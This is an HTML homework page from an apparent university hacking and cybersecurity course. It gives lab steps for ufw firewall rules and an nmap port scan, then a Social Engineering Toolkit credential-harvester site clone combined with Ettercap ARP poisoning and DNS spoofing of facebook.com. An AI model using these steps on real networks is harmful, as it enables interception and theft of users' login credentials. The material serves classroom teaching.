@@ -1,0 +1,84 @@
+<!doctype html>
+<html>
+<head>
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+<style type="text/css">
+td, th { border: 1px solid #c3c3c3; padding: 0 3px 0 3px; }
+table { border-collapse: collapse; }
+img { max-width: 100%; }
+</style>
+<meta name="generator" content="ReText 7.2.3">
+<title>Week08_Homework</title>
+<style type="text/css">
+</style>
+</head>
+<body>
+<h1>Week 8 - Supplementary Materials</h1>
+<p><a href="https://github.com/lawfareblog/hacking-cybersecurity/blob/main/week08/Week_08_Homework.md">Markdown</a> | <a href="https://raw.githubusercontent.com/lawfareblog/hacking-cybersecurity/main/week08/Week_08_Homework.pdf">PDF</a> | <a href="https://raw.githubusercontent.com/lawfareblog/hacking-cybersecurity/main/week08/Week_08_Homework.docx">MS Word DOCX</a> | <a href="https://raw.githubusercontent.com/lawfareblog/hacking-cybersecurity/main/week08/Week_08_Homework.odt">Libre ODT</a> | <a href="https://raw.githubusercontent.com/lawfareblog/hacking-cybersecurity/main/week08/Week_08_Homework.html">HTML</a></p>
+<h2>Firewalls</h2>
+<ul>
+<li>Use <code>nmap</code> to check for open ports 1 through 100.</li>
+</ul>
+<p><code>nmap -p1-100 -Pn 192.168.1.116</code></p>
+<ul>
+<li>Install the Unified Firewall <code>ufw</code> application to configure firewall ports.</li>
+</ul>
+<p><code>sudo apt-get install ufw</code></p>
+<p><code>sudo ufw enable</code></p>
+<ul>
+<li>Allow the SSH service (default is port 22) using either of these commands: </li>
+</ul>
+<p><code>sudo ufw allow ssh</code></p>
+<p><code>sudo ufw allow 22</code></p>
+<ul>
+<li>Check the status of the firewall and allow/deny rules: </li>
+</ul>
+<p><code>sudo ufw status</code></p>
+<ul>
+<li>You can deny all traffic for FTP (default is port 21) using either of these commands: </li>
+</ul>
+<p><code>sudo ufw deny ftp</code></p>
+<p><code>sudo ufw deny 21</code></p>
+<h2>Social Engineering Toolkit (SET)</h2>
+<ul>
+<li>Start SET: </li>
+</ul>
+<p><code>cd /usr/share/set/</code>
+<code>sudo setoolkit</code></p>
+<ul>
+<li>In the SET menu: </li>
+</ul>
+<p><code>1) Social Engineering Attacks</code> &gt; <code>2) Website Attack Vectors</code> &gt; <code>3) Credential Harvester Attack</code> &gt; <code>2) Site Cloner</code></p>
+<p><code>sudo ettercap -G</code></p>
+<ul>
+<li>In the Ettercap menu: </li>
+</ul>
+<p>"Unified sniffing"
+"hosts &gt; scan for hosts"
+"hosts &gt; host list"
+"MITM &gt; ARP Poisoning"
+"sniff remote connections"</p>
+<ul>
+<li>Navigate to <code>/usr/share/ettercap</code> and open <code>etter.dns</code></li>
+</ul>
+<p><code>cd /usr/share/ettercap</code>
+<code>ls</code>
+<code>sudo cp etter.dns.examples etter.dns</code>
+<code>sudo nano etter.dns</code></p>
+<ul>
+<li>Enter your IP address in etter.dns as a DNS "A" record to spoof facebook.com</li>
+<li>In the example below, we use the IP address 192.168.1.116 but please use your own for the Kali Linux VM. You can find this address using the network manager GUI in the top right-hand toolbar in Kali or via the <code>ifconfig</code> command in the terminal.</li>
+</ul>
+<p><code>facebook.com A 192.168.1.116</code>
+<code>*.facebook.com A 192.168.1.116</code>
+<code>http://facebook.com PTR 192.168.1.116</code></p>
+<ul>
+<li>In the Ettercap menu:</li>
+</ul>
+<p><code>Plugins</code> &gt; <code>Manage plugins</code> &gt; <code>dns_spoof</code></p>
+<ul>
+<li>Now try http://facebook.com in a Web browser on your local network (inside or outside of the Kali Linux VM).</li>
+</ul>
+
+</body>
+</html>
